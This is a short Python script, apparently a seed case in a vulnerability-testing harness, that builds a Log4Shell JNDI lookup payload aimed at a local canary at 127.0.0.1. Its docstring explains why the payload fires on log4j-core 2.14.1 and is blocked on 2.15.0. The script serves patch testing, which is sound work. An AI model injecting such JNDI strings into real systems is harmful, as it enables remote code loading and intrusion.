#!/usr/bin/env python3
"""[GIVEN] CVE-2021-44228 (Log4Shell) seed exploit for apache-log4j-2-cve-2021-45046.

The classic vector: an attacker-controlled string that is logged DIRECTLY as the log message
contains a JNDI lookup:

    logger.info("${jndi:ldap://127.0.0.1:1389/<token>}")

On V0 (log4j-core 2.14.1) message-text lookups are ON by default, so MessagePatternConverter
interpolates the message, JndiLookup fires an LDAP connection to the internal canary, and the
planted flag is echoed (REACHES). On V1 (2.15.0, CVE-2021-44228 patched) message-text lookups
are OFF by default -- the message is no longer interpolated -- so the lookup never fires
(BLOCKED). The internal canary is at 127.0.0.1, which is in 2.15.0's DEFAULT allowed-hosts, so
the block on V1 is specifically the message-lookup fix, NOT the host allow-list.
"""
import secrets

CANARY = "127.0.0.1:1389"


def candidate():
    token = "pcbtok" + secrets.token_hex(8)
    return {
        "id": "cve-2021-44228-message-lookup",
        "vector": "message",
        "token": token,
        "payload": "${jndi:ldap://" + CANARY + "/" + token + "}",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
